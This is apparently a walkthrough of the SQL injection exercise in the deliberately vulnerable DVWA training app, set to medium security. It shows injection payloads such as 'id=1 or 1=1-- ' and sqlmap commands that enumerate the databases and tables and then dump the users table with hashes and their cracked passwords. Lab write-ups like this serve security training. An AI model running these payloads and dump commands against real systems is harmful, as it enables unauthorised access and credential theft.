# [SQL Injection](http://localhost/vulnerabilities/sqli/)

So in medium security, this form now makes a POST request and the `id` input field 
is a dropdown with limited options.

The limited option dropdown field is no problem because we can make our own requests using 
Burp or curl.

We can prove SQL injection by submitting `id=2-1` which shows "admin" who is `id=1`

Can we return all the users? `id=1 or 1=1-- `

And yep we can. This security level doesn't seem to be any more upgraded other than it 
being a POST request. We know all the details of the DB from the previous security level.

But let's use `sqlmap` this time.

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7; security=medium" --dbs`

We get two dbs: *dvwa*, *information_schema*. Let's see the tables in *dvwa*

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7; security=medium" -D dvwa --tables`

Two tables: *guestbook*, *users*. And the columns of the *users* table.

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7; security=medium" -T users --columns`

Eight columns with our targets: *user* and *password*. Let's dump the contents and crack them.

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7; security=medium" -T users -C user,password --dump`

> +---------+---------------------------------------------+
> | user    | password                                    |
> +---------+---------------------------------------------+
> | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
> | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
> | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
> | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
> | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
> +---------+---------------------------------------------+
